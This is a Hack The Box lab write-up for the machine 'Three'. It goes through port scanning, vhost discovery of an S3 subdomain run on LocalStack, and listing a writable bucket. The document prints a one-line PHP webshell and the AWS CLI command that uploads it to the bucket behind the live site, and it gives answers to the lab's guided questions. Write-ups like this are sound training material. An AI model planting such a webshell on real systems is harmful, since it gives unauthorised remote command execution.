# HTB Writeup: Three

**Target IP:** 10.129.77.94
**Domain:** thetoppers.htb
**Platform:** Hack The Box

## 1. Reconnaissance

### Nmap

```bash
sudo nmap -sV -p- 10.129.77.94
```

```
Nmap scan report for 10.129.77.94
Host is up (0.042s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two open ports: **SSH (22)** and **HTTP (80)**.

### Resolving the hostname

Since there's no DNS server on the network, the site's domain has to be mapped manually via `/etc/hosts` so the browser can resolve it:

```bash
echo "10.129.77.94 thetoppers.htb" | sudo tee -a /etc/hosts
```

### Virtual host enumeration

Ran a vhost bruteforce against the resolved domain with gobuster:

```bash
gobuster vhost -w subdomains-5000.txt -u http://thetoppers.htb --append-domain -q
```

(`-q` to cut the noise, `--append-domain` to target true subdomains. ffuf didn't produce usable results for this one — gobuster did.)

```
s3.thetoppers.htb Status: 404 [Size: 21]
```

Found a subdomain: `s3.thetoppers.htb`. Added it to `/etc/hosts` as well:

```bash
echo "10.129.77.94 s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

### Probing the new subdomain

```bash
curl -i s3.thetoppers.htb
```

```
HTTP/1.1 404
Date: Sat, 04 Jul 2026 17:04:34 GMT
Server: hypercorn-h11
Content-Type: text/html; charset=utf-8
Content-Length: 21
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
Access-Control-Allow-Headers: authorization,cache-control,content-length,content-md5,content-type,etag,location,x-amz-acl,x-amz-content-sha256,x-amz-date,x-amz-request-id,x-amz-security-token,x-amz-tagging,x-amz-target,x-amz-user-agent,x-amz-version-id,x-amzn-requestid,x-localstack-target,amz-sdk-invocation-id,amz-sdk-request
Access-Control-Expose-Headers: etag,x-amz-version-id
```

The `x-amz-*` / `x-localstack-target` headers are the giveaway: this is an **S3-compatible bucket** served via **LocalStack**, reachable with the standard AWS CLI.

## 2. Exploitation

### Enumerating the bucket

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls
```

```
2026-07-04 18:28:32 thetoppers.htb
```

A bucket matching the site's own domain. Listed its contents:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

The bucket holds the live site's files — meaning it's writable, not just readable, which turns this into a direct path to code execution on the webserver.

### Uploading a PHP webshell

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb/shell.php
```

Since the bucket backs the live Apache site, the uploaded file becomes reachable directly over HTTP:

```
http://thetoppers.htb/shell.php?cmd=whoami
```

Command execution confirmed — the webshell works, giving code execution on the target as the web server user. From here the shell can be upgraded to a full reverse shell to grab the flag.

## 3. Guided Questions

| # | Question | Answer |
|---|----------|--------|
| 1 | How many TCP ports are open? | `2` |
| 2 | What is the domain of the email address provided in the "Contact" section of the website? | `thetoppers.htb` |
| 3 | In the absence of a DNS server, which Linux file can be used to resolve hostnames to IP addresses? | `/etc/hosts` |
| 4 | Which sub-domain is discovered during further enumeration? | `s3.thetoppers.htb` |

## 4. Flags

*(TODO: add flag value once re-verified)*

## Key Takeaways

- **Vhost bruteforcing is essential** when a box only resolves through `/etc/hosts` — the "real" attack surface can live entirely on a subdomain that a plain port scan won't reveal.
- **Unusual response headers are worth reading closely.** The `x-amz-*` / LocalStack headers immediately identified the service as an S3-compatible bucket instead of a generic 404 page.
- **A writable bucket backing a live website is effectively arbitrary file upload.** Dropping a PHP webshell directly into the bucket achieved code execution with no further exploitation needed.
